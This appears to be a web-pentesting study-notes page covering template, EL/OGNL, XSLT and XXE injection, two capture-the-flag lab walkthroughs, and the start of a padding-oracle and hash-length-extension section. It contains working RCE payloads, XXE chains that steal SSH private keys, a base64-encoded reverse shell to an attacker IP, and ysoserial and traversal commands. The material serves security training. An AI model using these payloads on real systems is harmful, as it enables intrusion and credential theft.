https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations   Language Evaluation  Includes:  - Double evaluation - Server-side Template Injections - Expression language injections      All caused by users ability to force the target application server to execute arbritrary programmistic code. This code is always in form of an expression    Template Engines  Similar to the SSI, some web apps use template systems to enable dynamic content generation into their pages:  $template-&gt;render(\"Hello ${user_name}!\")      The expression ${} = the Template Expression    which holds the user_name variable. We dont know the origin of the user_name;   Presumably its generated server-side (during login). Using the template engine, its possible to dynamically print that user name on the login page   $template-&gt;render(\"Hello $_GET['user_name']!\") # in this case, the user could be able to inject the template expression independently.  # We now control what will be evaluated and most likely, user_name is the last thing of interest.   Most popular languages which use templates in web dev:  - PHP (Twig, Smarty) - Python (Flask, Jinja) - Java (Freemarker)   In Java apps, some technologies have a similar purpose of generating dynamic content:  - OGNL (Object-Graph Navigation Language) - frequently used in Apache Struts RCE exploits - EL (Expression Language) - generic dynamic expression set For Java applications   Detecting Template Injection  Tricky to find and exploit      we can inject multiple template tags into the web app and observe if they were transformed in some way in the response   Keep in mind, that often the injected data might be reflected indirectly, For instance, on a different page than it was injected (e.g. invalid login names might be reflected in admin-only accessible logs)   Most template expression are similar to each other; they are all in curly braces like the below examples:   { {expr} } ${expr} %{expr} #{expr} %25{expr} {expr}   Confirming Template Injection  The best expression to inject:  ${5*11111} # in this case, you would look For the value '55555' in the response of your request      Further confirmation is required to be sure that the code is executed on the server-side and has access to sensitive data    With Burp Suite PRO, u should get an extension named J2EE Scan which automatically adds tests FOr expression language injection   Another idea could be to use Burp Intruder to test several payloads of that type, as its likely that while,   For example:  #{5*11111} # will work %{5*11111} # may not   You can use the following diagram to help u profiling this type of vuln, whether its a template or expression language injection      To better identify the technology  The first step after observing anomalies related to calculations or unusual handling of expressions in curly braces should be trying to identify the underlying technology      Observe which is the generic technology of the app. If its Java (u see it used .jsp extensions), then u can suspect its an expression language / OGNL   Use the diagram from before as it contains popular behavior of template engines when handling expressions   Try to inject unclosed curly braces (be careful as there is a chance u might permanently disable the attacked webpage); This might provoke verbose error disclosing the underlying technology   Observe other verbose errors For technology names   Exploiting Template Injection  PHP Smarty:  # The RCE payload can be as simple as the one-liner: {php}echo 'id';{/php}   Python Mako:  &lt;%   import os   x=os.popen('id').read() %&gt; ${x}   PHP Twig:   https://github.com/s4n7h0/xvwa  { {5*5} }  # results in \"25\"  { {&lt;svg/onload=confirm(1)&gt;} } # u can observe a XSS vuln   Twig used a known object named ** = current application instance      one of the twigs _self attributes is named env and contains other methods that can be called   → https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php   Example display function:  { { _self.env.display(\"xyz\") } }   Executing commands via the getFilter function must be done as follows:  - Call registerUndefinedFilterCallback, which allows us to register any function as a filter callback - The filter callback is then called by invoking _self.env.getFilter()   Example:  { { _self.env.registerUndefinedFilterCallback(\"system\") } } { {_self.env.getFilter(\"whoami\") } }   Moreover:  - https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf   Expression Language / OGNL injection  Java apps are easily recognizable because:  - Use common extensions like .jsp or .jsf - Throw stack traces on errors - Use known terms in headers like \"Servlet\"   Confirm the injection with a calculation output:  ${*5} {5*5} #{5*5} %{5*5} %25{5*5}      The code is saved as Main.java      Several jars should be present to test properly   → https://commons.apache.org/proper/commons-lang/download_lang.cgi   → https://www.javadoc.io/doc/org.springframework/spring-core/latest/index.html   → https://www.javadoc.io/doc/org.springframework/spring-expression/latest/index.html      Make sure u have JDK working       try to run javac and java -version   Otherwise:  apt install update and install default-jdk   Compile the jar libraries  javac -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:.Main.java   Now we can use the java command, just change the javac to java and remove the .java extension at the end of the program name  java -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:.Main   Enter a String to evaluate:  {5*5} [25]   Talking to EL Parser  As the environment is set up, u can start to test the expressions:  {\"aaaa\".toString()} [aaaa] {\"bbb\".replace(\"b\",\"x\")} [xxx]   Playing with Classes  In situations where we cannot write plain code:  {\"x\".getClass()} [class java.lang.String]  {\"\".getClass().forName(\"java.util.Date\")} [class java.util.Date]   Enumeate the objects methods:  {\"\".getClass().forName(\"java.util.Date\").getMethods()[0].toString()} [public boolean java.util.Date.before(java.util.Date)]      The first accessible method of java.util = before()       https://www.javatpoint.com/java-date-before-method   The data package has a before() method that takes a Date object as an argument   EL Code Execution  Trying RCE:  Java.lang.Runtime.getRuntime().exec(command) java.lang.ProcessBuilder(command, argument1, argument2).start()   getRuntime try:  {\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6].toString()} [public static java.lang.Runtime java.lang.Runtime.getRuntime()]   Invoke the final function:  {\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")} [Process[pid=2770, exitValue=0]]   In such a scenario, we would rather go For an interactive reverse shell. In this case, we confirm the existence of code execution by issuing curl,  as follows:  {\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"curl http://127.0.0.1/rce\")} [Process[pid=2816, exitValue=\"not exited\"]]   The request is received on a netcat listener:  nc -lvnp 80   Curl is very useful, we can transfer files to and from the victim machine      So we can move a reverse shell and run it using the template injection RCE vuln    Extending EL Exploitation  Server variables usually have universal names - like :  - ${application}  - ${session} - ${request}      Burp Intruder can be utilized For injecting these and looking if interesting data is not returned in result (if the object is resolved)    Some variables names can look like (they are executed in their respective template curly braces):  applicationScope # global application variables requestScope # request variables initParam # application initialization variables sessionScope # session variables param.X # parameter value where X is name of a http parameter   We can retrieve with .toString like that:  ${sessionScope.toString()}   Sample authorization bypass might be similar to the below statement:  ${pageContext.request.getSession().setAttribute(\"admin\",true)}   With burp intruder we can find variables with wordlists (like the follow):  ${user} ${password} ${employee.FirstName}   Moreover:  - https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/ - https://sethjackson.github.io/2018/04/16/el-injection/ - https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/   lets compile and exploit a simple example of the Spring Expression Language injection   XSLT Purpose  eXtensible Stylesheet Language Transformations is a language used in XML document transformations      aka as XSL    The output of the transformation can be anything, but often is another xml or html-type file.      XSL uses its built-in functions and XPATH language to select and change parts of an XML document   XSLT Example      &lt;xsl:template-match=\"/\"&gt; is a directive that means that this stylesheet should apply to any (\"/\") xml nodes # For any XML structure (\"/\"), the output will look like the red code.      You can also see other XSL directives. Those two use XPATH, which is a language used to traverse XML documents and find certain values. In this case, we use the value of (starting from the root node):  Catalog   cd     title      In the end, we receive an HTML table that contains values of the node title. Its purposely doubled. Of course, any other element can be imported into the result table.   Experimenting with XSLT Parser  Few well-known XSLT engines:  - Saxon - Xalan   apt install default-jdk apt install libsaxonb-java   XSLT Documentation  - https://www.w3.org/TR/xslt-10/ - https://www.w3.org/TR/xslt20/ - https://www.w3.org/TR/xslt-30/   XSLT File Read  If we control the XSL file:  unparsed-text($href as xs:string?) as xs:string? unparser-text($href as xs:string?, $encoding as xs:string) as xs:string?  # the 'unparsed-text' function reads an external resource  # (For example: a file) and returns its contents as a string   Example:  &lt;xsl:value-of select=\"unparsed-text('/etc/passwd', 'utf-8')\"/&gt; # the result contains a /etc/passwd file      XSL:Include is another interesting function, which allows us to join another xsl stylesheet. The downside is, it has to be a valid XSL document. Upside: SSRF is still possible.   XSLT SSRF  &lt;xsl:include href=\"http://127.0.0.1:8080/xslt\"/&gt;   The netcat listener receives the request. We can recognize the victim java version in the User-agent header.  nc -lvnp 8080   Extending XSLT Attacks  In real world, its tough. But again documentation might help u to identify a severe vuln. Also, XSLT parsers may be vulnerable to XXE vulns in the same way as all other XML parsers.      WHen responding to XSL:INCLUDE directives, u might also try to respond with XML that contains an XXE payload.       Moreover, XSLT engines might be able to execute custom code, which results in RCE    the second input is the XSLT code   the transformation is defined   in this case, we use the value of (starting from the root node)   unparsed-text example   Lab 1 - SSRF to RCE   Solution   Step 1: Open the lab link to access the Kali GUI instance.   …   Step 2: Check if the provided machine/domain is reachable.   Command:  ping -c3 demo.ine.local      The provided machine is reachable.    Step 3: Check open ports on the provided machine.   Command:  nmap -sS -sV demo.ine.local   Ports 22 (SSH), 5000, and 8000 (Python-based HTTP server) are open on the target machine. As mentioned in the challenge description, the vulnerable web application is available on port 5000.   Also, if you check the output from Nmap, you will find out the fingerprint for the service running at port 5000. It contains the HTTP response.   Step 4: Check the web application available on port 5000.   Open the following URL in the browser:  URL: http://demo.ine.local:5000   An XML Validator application is available on port 5000.   Send the following XML snippet for validation:  &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;parent&gt;   &lt;child&gt;     &lt;name&gt;Test Name&lt;/name&gt;     &lt;description&gt;Test Description&lt;/description&gt;   &lt;/child&gt; &lt;/parent&gt;   Click on the Validate XML button:      The response indicates that the supplied XML is valid.      Notice that the supplied XML is also reflected in the response.    Step 5: Identify and exploit the XXE vulnerability.   Send the following XML snippet containing an XML entity:  &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE replace [&lt;!ENTITY desc \"Test Description\"&gt; ]&gt; &lt;parent&gt;   &lt;child&gt;     &lt;name&gt;Test Name&lt;/name&gt;     &lt;description&gt;&amp;desc;&lt;/description&gt;   &lt;/child&gt; &lt;/parent&gt;      Notice the response contains the description specified in the XML entity!       Note that we know there is an XXE vulnerability; lets leverage it to pull information on the internal services running on the target machine.    Use the following XML snippet to read the contents of the /proc/net/tcp file:  &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE data [   &lt;!ENTITY file SYSTEM \"file:///proc/net/tcp\"&gt; ]&gt;  &lt;data&gt;&amp;file;&lt;/data&gt;   Information: The /proc/net/tcp file contains information on the current TCP network connections.      Notice we got back the file contents!    Contents of the /proc/net/tcp file:  sl local_address rem_address st tx_queue rx_queue tr tm-&gt;when retrnsmt uid timeout inode 0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74435656 1 0000000000000000 100 0 0 10 0 1: 0100007F:22B8 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74418007 1 0000000000000000 100 0 0 10 0 2: 0B00007F:9599 00000000:0000 0A 00000000:00000000 00:00000000 00000000 65534 0 74430920 1 0000000000000000 100 0 0 10 0 3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74434697 1 0000000000000000 100 0 0 10 0 4: 034CDCC0:1F40 024CDCC0:EB4C 06 00000000:00000000 03:0000176F 00000000 0 0 0 3 0000000000000000 5: 034CDCC0:1F40 024CDCC0:EB4E 01 00000000:00000000 00:00000000 00000000 0 0 74434828 1 0000000000000000 20 4 30 10 -1      [Note] The information you received would differ slightly since the IP addresses of the machines change at every lab launch. Kindly make sure to fetch the contents of the above file before proceeding.    Step 6: Decode the IP addresses and port numbers retrieved from the /proc/net/tcp file.   Use the following Python script to convert the IP addresses in hex to dotted-decimal notation:   convert.py:  import socket import struct hex_ip = input(\"Enter IP (in hex): \") addr_long = int(hex_ip, 16) print(\"IP in dotted-decimal notation:\", socket.inet_ntoa(struct.pack(\"&lt;L\", addr_long)))   Convert the hex IP addresses received from /proc/net/tcp file:   Command:  python3 convert.py    Once all the IP addresses are converted, look for the internal IPs. In this case, it’s 127.0.0.1 and 127.0.0.11   Let’s also convert the ports from hex to decimal system:   Commands:  python3 0x0016 0x22B8 0x9599 0x1F40      The ports corresponding to internal IPs are 8000 and 38297, respectively.    Step 7: Perform an SSRF attack to interact with internal services.   Check the IP address of the attacker machine:   Command:  ip addr   The IP address of the attacker machine is 192.220.76.2      [Note] The IP address of the machines is bound to change with every lab start. Kindly make sure to get the correct IP address before moving on to the next steps. Failing to do that would result in failed exploitation attempts.    We will send the following XML snippet to the vulnerable web application:  &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;!DOCTYPE data [   &lt;!ENTITY % dtd SYSTEM \"http://192.220.76.2:8080/evil.dtd\"&gt;   %dtd;   %all; ]&gt; &lt;data&gt;&amp;fileContents;&lt;/data&gt;      [Note] Kindly make sure to replace the IP address in the above payload.    Before sending the above XXE payload, save the following snippet as evil.dtd:  &lt;!ENTITY % start \"&lt;![CDATA[\"&gt; &lt;!ENTITY % file SYSTEM \"http://localhost:8888\"&gt; &lt;!ENTITY % end \"]]&gt;\"&gt; &lt;!ENTITY % all \"&lt;!ENTITY fileContents '%start;%file;%end;'&gt;\"&gt;   Start a Python-based HTTP server on port 8080:   Command:  python3 -m http.server 8080   Information on the payload:   The first payload (sent to the web app for validation) would load the contents of the evil.dtd file from the attacker machine and then this file would be parsed by the backend.   The evil.dtd file contains the entity that sends a request to localhost:8888 and the result is embedded within the CDATA section.   Information on CDATA:  CDATA sections can be used to \"block escape\" literal text when replacing  prohibited characters with entity references is undesirable.      Reference: https://www.w3resource.com/xml/CDATA-sections.php   Some examples of prohibited characters are:  &lt; , &gt; , &amp; , \" , ' .   So, the above payload makes sure that if the response does contain some restricted characters, those characters will get embedded into the CDATA section, and hence the XML validator will raise no errors.   Now we are ready to send the XXE payload:   Notice the response contains a directory listing. It must be some sort of HTTP server.      The response indicates the presence of files like flag1 and directories like .ssh.    Head back to the terminal running the Python-based HTTP server:           Notice there was a request from the target machine to fetch the evil.dtd file.            Save the HTML contents received from the internal HTTP server:       Command:  cat listing.html   Open the listing.html file in the browser:   URL:  file:///root/listing.html   Notice there are 2 entries: .ssh/ and flag1.   Lets fetch these in the subsequent steps.      [Note] The other internal port open on the machine won’t return any information. U r encouraged to interact with it by modifying the evil.dtd file to contain the IP and port on which that service is running.    Step 8: Retrieve the first flag via XXE.   Modify the evil.dtd file to fetch the contents of file flag1:  &lt;!ENTITY % start \"&lt;![CDATA[\"&gt; &lt;!ENTITY % file SYSTEM \"http://localhost:8888/flag1\"&gt; &lt;!ENTITY % end \"]]&gt;\"&gt; &lt;!ENTITY % all \"&lt;!ENTITY fileContents '%start;%file;%end;'&gt;\"&gt;   Start a Python-based HTTP server on port 8080:   Command:  python3 -m http.server 8080   Send the same XXE payload we sent in the last step:  &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;!DOCTYPE data [   &lt;!ENTITY % dtd SYSTEM \"http://192.220.76.2:8080/evil.dtd\"&gt;   %dtd;   %all; ]&gt; &lt;data&gt;&amp;fileContents;&lt;/data&gt;   The contents of flag1 file are retrieved:  Flag 1: 5f1210be00b4b8dfecba7b56181d905c   Head back to the terminal running the Python-based HTTP server:   Notice there was a request from the target machine to fetch the evil.dtd file.   Step 9: Fetch the contents of the .ssh directory.   Modify the evil.dtd file to fetch the contents of .ssh directory:  &lt;!ENTITY % start \"&lt;![CDATA[\"&gt; &lt;!ENTITY % file SYSTEM \"http://localhost:8888/.ssh/\"&gt; &lt;!ENTITY % end \"]]&gt;\"&gt; &lt;!ENTITY % all \"&lt;!ENTITY fileContents '%start;%file;%end;'&gt;\"&gt;   Start a Python-based HTTP server on port 8080:   Command:  python3 -m http.server 8080   Send the same XXE payload we sent in the last step:  &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;!DOCTYPE data [   &lt;!ENTITY % dtd SYSTEM \"http://192.220.76.2:8080/evil.dtd\"&gt;   %dtd;   %all; ]&gt; &lt;data&gt;&amp;fileContents;&lt;/data&gt;   The directory listing for .ssh directory is retrieved:   Save the retrieved HTML contents:   Command:  cat listing.html   Open the listing.html file in the browser:   URL:  file:///root/listing.html   Notice there are three files in the .ssh directory:  authorized_keys id_rsa id_rsa.pub   In the subsequent steps, we will fetch some of these files.   Step 10: Retrieve the private SSH keys.   Modify the evil.dtd file to fetch the contents of id_rsa file:  &lt;!ENTITY % start \"&lt;![CDATA[\"&gt; &lt;!ENTITY % file SYSTEM \"http://localhost:8888/.ssh/id_rsa\"&gt; &lt;!ENTITY % end \"]]&gt;\"&gt; &lt;!ENTITY % all \"&lt;!ENTITY fileContents '%start;%file;%end;'&gt;\"&gt;   Start a Python-based HTTP server on port 8080:   Command:  python3 -m http.server 8080   Send the same XXE payload we sent in the last step:  &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;!DOCTYPE data [   &lt;!ENTITY % dtd SYSTEM \"http://192.220.76.2:8080/evil.dtd\"&gt;   %dtd;   %all; ]&gt; &lt;data&gt;&amp;fileContents;&lt;/data&gt;   The response contains the private SSH keys.   Save the contents of the private keys to the id_rsa file:   Command:  cat id_rsa   The private SSH key is missing the new lines.   To restore the file, we can use the following command:   Command:  sed -e \"s/-----BEGIN RSA PRIVATE KEY-----/&amp;\\n/\" \\ -e \"s/-----END RSA PRIVATE KEY-----/\\n&amp;/\" \\ -e \"s/\\S\\{64\\}/&amp;\\n/g\" \\ id_rsa   The output contains the properly-formatted private SSH key.   The above command does the following: - Adds a new line after the  -----BEGIN RSA PRIVATE KEY----- string - Adds a new line before the -----END RSA PRIVATE KEY----- string - For all other string blocks, it adds a new line after every 64 characters   Use the following command to save the formatted private key to the file fixed_id_rsa:   Command:  sed -e \"s/-----BEGIN RSA PRIVATE KEY-----/&amp;\\n/\" \\ -e \"s/-----END RSA PRIVATE KEY-----/\\n&amp;/\" \\ -e \"s/\\S\\{64\\}/&amp;\\n/g\" \\ id_rsa &gt; fixed_id_rsa   Check the contents of the fixed_id_rsa file:   Command:  cat fixed_id_rsa   The well-formatted private SSH key has been placed in a file.   Step 11: Gain SSH access on the target machine.   We have the private SSH key but don’t yet know the user to whom it belongs.   To use the SSH keys for login, we have to find out the corresponding user name. For that, we will be using the public SSH keys. This file could contain the email of the user or the account name followed by the hostname. In either case, we will find the user name.   Modify the evil.dtd file to fetch the contents of the id_rsa.pub file:  &lt;!ENTITY % start \"&lt;![CDATA[\"&gt; &lt;!ENTITY % file SYSTEM \"http://localhost:8888/.ssh/id_rsa\"&gt; &lt;!ENTITY % end \"]]&gt;\"&gt; &lt;!ENTITY % all \"&lt;!ENTITY fileContents '%start;%file;%end;'&gt;\"&gt;   Start a Python-based HTTP server on port 8080:   Command:  python3 -m http.server 8080   Send the same XXE payload we sent in the last step:  &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;!DOCTYPE data [   &lt;!ENTITY % dtd SYSTEM \"http://192.220.76.2:8080/evil.dtd\"&gt;   %dtd;   %all; ]&gt; &lt;data&gt;&amp;fileContents;&lt;/data&gt;   The contents of the public SSH key were successfully retrieved.   The email id of the user is also revealed:  david@insecure-corp.com   Modify the permissions of the fixed_id_rsa file and SSH into the target machine:   Commands:  chmod 600 fixed_id_rsa ssh -i fixed_id_rsa david@demo.ine.local      SSH login was successful!    Step 12: Retrieve the second flag.   Now that we have SSH access to the target machine, we can issue commands to perform recon and retrieve all the flags.   Commands:  id ls cat flag1  find / -iname 'flag*' 2&gt;/dev/null    Flag 1 (/home/david/flag1): 5f1210be00b4b8dfecba7b56181d905c   Flag 2 is stored in /tmp/flag2 file:   Command:  cat /tmp/flag2   Flag 2: 173b0344950d28e8b5dc36dd462edaa9   With that, we conclude this lab. We have learned to leverage an XXE vulnerability to perform an SSRF attack. Using the SSRF attack, we interacted with an internal HTTP server, got hold of SSH keys for a user, and got shell access on the target machine.   References  1 - A4:2017-XML External Entities (XXE) 2 - A10:2021 – Server-Side Request Forgery (SSRF) 3 - XML CDATA  1 - https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A4-XML_External_Entities_(XXE) 2 - https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/ 3 - https://www.w3resource.com/xml/CDATA-sections.php   Lab 2 - XSLT to Code Execution   Solution   Step 1: Open the lab link to access the Kali GUI instance.   …   Step 2: Check if the provided machine/domain is reachable.   Command:  ping -c3 demo.ine.local   The provided machine is reachable.   Step 3: Check open ports on the provided machine.   Command:  nmap -sS -sV demo.ine.local      Apache web server is running on port 80 on the target machine.    Step 4: Check the web application stack.   We will use curl to check the response headers and identify the application stack:   Command:  curl -I demo.ine.local      Notice the output indicates the web server is Apache (which we already know from the Nmap scan), and the backend web application is PHP-based.    Step 5: Check the web pages served on the target machine.   Open the following URL in the browser:  URL: http://demo.ine.local/   An Online Transformation Service application is provided. It expects an XML and an XSL file to be uploaded by the user. After both the files are uploaded, the XML file is transformed according to the instructions in the XSL file.   Information: XSL (eXtensible Stylesheet Language) is a styling language for XML. XSLT stands for XSL Transformations.  Reference: https://www.w3schools.com/xml/xsl_intro.asp   Step 6: Save a test XML file and an XSL file to detect the backend XSLT engine information.   Save the following content as test.xml:  # test.xml:  &lt;?xml version=\"1.0\"?&gt; &lt;root&gt;Hello, World!&lt;/root&gt;  Save the following content as test.xsl:   test.xsl:  &lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;   &lt;xsl:output method=\"html\"/&gt;   &lt;xsl:template match=\"/\"&gt;   &lt;h2&gt;XSLT Engine Info:&lt;/h2&gt;   &lt;b&gt;Version:&lt;/b&gt;&lt;xsl:value-of select=\"system-property('xsl:version')\" /&gt;&lt;br/&gt;   &lt;b&gt;Vendor:&lt;/b&gt;&lt;xsl:value-of select=\"system-property('xsl:vendor')\" /&gt;&lt;br/&gt;   &lt;b&gt;Vendor URL:&lt;/b&gt;&lt;xsl:value-of select=\"system-property('xsl:vendor-url')\" /&gt;&lt;br/&gt;   &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;   Notice the contents of the XSL file. It contains the xsl tags to pull the information about the XSLT engine used by the backend:  xsl:version xsl:vendor xsl:vendor-URL   Step 7: Upload the saved XML file to the server.   Select the XML file to be uploaded:      Upload the XML file to the server   The XML file was successfully uploaded   Step 8: Upload the saved XSL file to the server.           Select the XSL file to be uploaded            Upload the XSL file to the server          The XSL file was successfully uploaded    Step 9: Transform the XML file according to the uploaded XSL file.           Click on the transform button to process and transform the XML file according to the uploaded XSL file            We are redirected to the /transform.php page containing the XSLT engine details       The backend is running XSLT version 1.0, and the vendor is libxslt, which is one of the popular and widely used XSLT processors.   Step 10: Exploiting XSLT processor to run arbitrary commands.      By now, we have understood that the backend is running PHP and using the libxslt processor. Also, the processor parses the user-supplied files without any sanitization, as far as we have used it.    Now we will try to execute PHP functions from the XSL file. This will only work if registerPHPFunctions is enabled for the XSLT processor, as shown in the following post: https://laurent.bientz.com/Blog/Entry/Item/using_php_functions_in_xsl-7.sls   To try this, we will upload another XSL file. Head back to the index page of the application:  URL: http://demo.ine.local   Save the following content under the test.xslt file:   test.xsl:  &lt;xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" version=\"1.0\"&gt; &lt;!-- We add the PHP's xmlns --&gt;   &lt;xsl:template match=\"/\"&gt;     &lt;html&gt;        &lt;!-- We use the php suffix to call the functions --&gt;        &lt;xsl:value-of select=\"php:function('system','uname -a')\" /&gt;        &lt;!-- Output: 'Php Can Now Be Used In Xsl' --&gt;     &lt;/html&gt;   &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;      Notice that we have specified the uname -a command to be executed via the PHP system function.    If the backend XSLT processing code has registered PHP functions, then the above code would run, and we will see the output of the uname -a command on the resulting page.   Upload the modified XSL file:      Now click on the Transform! button   Notice the output of the uname -a command is shown on the resulting page:      This confirms the backend XSLT processing code has registered PHP functions. This configuration is inherently vulnerable because the user-supplied XSL files are processed as is, without any sanitization/filtering.    Step 11: Obtain a reverse shell on the target server.   Check the IP address of the attacker machine:   Command:  ip addr   The IP address of the attacker machine is 192.170.91.2/24.      [Note] The IP address assigned to your Kali GUI instance would certainly be different. Please make sure to replace it in the subsequent commands.    Next, we will base64-encode the reverse shell payload to avoid it being tampered with while uploading over HTTP:   Command:  echo \"/bin/bash -c 'bash -i&gt;&amp; /dev/tcp/192.170.91.2/54321 0&gt;&amp;1'\" | base64 -w0 ; echo      [Note] Make sure to replace the IP address in the above command.    Add the reverse shell payload in the XSL file:   test.xsl:  &lt;xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" version=\"1.0\"&gt; &lt;!-- We add the PHP's xmlns --&gt;   &lt;xsl:template match=\"/\"&gt;     &lt;html&gt;       &lt;!-- We use the php suffix to call the functions --&gt;       &lt;xsl:value-of select=\"php:function('system','echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pPiYgL2Rldi90Y3AvMTkyLjE3MC45MS4yLzU0MzIxIDA+JjEnCg==|base64 -d|bash')\" /&gt;         &lt;!-- Output: 'Php Can Now Be Used In Xsl' --&gt;       &lt;/html&gt;   &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;      Notice we have added commands to decode and execute the reverse shell payload on the backend server.    Start a Netcat listener on the attacker machine:   Command:  nc -lvp 54321           Upload the modified XSL file:       Now click on the Transform! button   Notice the page keeps on loading   Check the terminal where the Netcat listener was running      We have received back a reverse shell session from the target server.    Step 12: Retrieve the flag.   Now that we have a shell session on the target server, we can execute OS commands and perform some enumeration:   Commands:  id ps aux   Run the following command to locate the flag file:   Command:  find / -iname *flag* 2&gt;/dev/null      The flag is present in the /flag.txt file.    Read the contents of the flag file:   Command:  cat /flag.txt   FLAG: fdf9c7da429441eaa1620eceafc34d9f      With that, we conclude this lab on leveraging XSLT for code execution.   References  https://www.w3schools.com/xml/xsl_intro.asp https://blog.pentesteracademy.com/xslt-injections-for-dummies-a0cfbe0c42f5 https://laurent.bientz.com/Blog/Entry/Item/using_php_functions_in_xsl-7.sls  ","categories": ["notes","ewptx"],
        "tags": ["advanced","pentest","web"],
        "url": "/notes/ewptx/serverside/",
        "teaser": "/assets/images/posts/ewptx/ewptx-teaser12.jpg"
      },{
        "title": "12 - Attacking Crypto",
        "excerpt":"  Attacking Crypto      Padding Oracle Attack   Hash Length Extension Attack   Leveraging machineKey   Subverting HMAC in Node.js   What is a Padding Oracle  In web app an Oracle is any application functionality, error message or behavior that can reveal valuable information      https://robertheaton.com/2013/07/29/padding-oracle-attack/   This attack leverages proper and improper padding as a means of gaining application information   CBC-mode decryption funcions operating with PLCS7-mode padding      http://seffyvon.github.io/cryptography/2014/08/20/CBC-Padding-Oracle-Attacks/   A padding oracle can reveal if the padding is correct For a given ciphertext.   Another resource:      http://netifera.com/research/poet/PaddingOracleBHEU10.pdf   Intermediate Values  Are the output of the block cipher during the block cipher process   Essentially, they can be seen as the state of a ciphertext block after decryption and before the XOR operation with the previous ciphertext block   Once intermediate bytes are found, deciphering the plaintext of the corresponding ciphertext is easy   Padding Oracle Attack Scenario  Scenario of attack against Apache Shiro   Apache Shiro is a Java Security framework that has functions to perform authentication, authorization, password, and session management.      older shiro versions suffered from a Padding Oracle Vulnerability, that when chained with a another deserialization-based vulnerability could result in RCE   Shiro used the AES-128-CBC mode to encrypt cookies enabling Padding Oracle attacks.   Moreover:      https://www.anquanke.com/post/id/192819   Creating vulnerable environment  We have set up our own vuln environment using Apache Shiro 1.4.1 + tomcat:8-jre8  git clone https://github.com/apache/shiro.git cd shiro git checkout shiro-root-1.4.1 mvn install cd samples/web mvn install   Copy the samples-web-1.4.1.war package (samples/target) obtained after compilation to the Tomcat webapps directory  start tomcat   The attack   1 - Grab cookie with BURP   2 - Create a serialized payload with YsoSerial:  java -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 \"touch /tmp/Success\" &gt; payload.class   3 - Download the publicly available exploit:  https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py # use to captures the 'remember me' cookie as a prefix For the Padding Oracle attack   4 - After a couple hours the exploit script provided us with a valid cookie containing our payload. This cookie will be deserialized by the vuln server   5 - Use BURP Repeater to issued a request with out crafted cookie.      The Padding Oracle Attacks are Chosen-Ciphertext Attacks (CCA)    Fundamentals  There are web apps that prepend a secret value to data, hash this value with a flawed algorithm and provides the user with both data and the hash, but not the secret  # On other part of the communication, the server relies on the secret For data validation purposes # An attacker that does not know the value of the secret can still generate a valid hash For  {secret || data || attacker_controlled_data}.  # An attacker can calculate a valid hash For a message without knowing the value of the secret.  # He can do that by just guessing its length. Hashes are calculated in blocks and the hash of one block is the state For the next block.   Example   Request:  stock_quantity=20&amp;price=1000   Hash:  [secretpass|stock_quantity=20&amp;price=1000|padding] =&gt; Hash1/State1   Final Request:  stock_quantity=20&amp;price=1000&amp;hash=Hash1      If an attacker manages to identify the length of padding, he will have all the info needed to calculate a new hash.    Attack Hash:  [secretpass|stock_quantity=20&amp;price=1000|padding|&amp;price=100]   Attack Hash:  [State1|&amp;price=10]=&gt;Hash2/State2   Final Request:  stock_quantity=20&amp;price=1000+padding&amp;price=100&amp;hash=Hash2   Moreover the calculations required during Hash Length Extension Attacks:  https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks   Hash length extension Scenario     https://github.com/SpiderLabs/CryptOMG   Challenge 5 is what we need to witness how a hash length extension can be performed   Lets try reading the contents of /etc/passwd by executing the attack   We dont need to know the secret value being used. We only need to successfully guess the length of the secret.   For this task we can use hash_extender:  #  https://github.com/iagox86/hash_extender # The specify a known hash value # The specify an estimation regarding the secrets length (between 10 and 40 bytes) # We will have to experiment with the amount of ../../ to be used  ./hash_extender -f sha1 --data 'test' -s &lt;hash&gt; --append '../../../../../../../../../etc/passwd' --secret-min=10 --secret-max=40 --out-data-format=html --table &gt; payloads.out      Now use the payloads.out inside the BURP Intruder   we will follow a Sniper approach      Eventually, we are able to see the content of /etc/passwd by means of a Hash Length Extension Attack.       The importance of machineKey     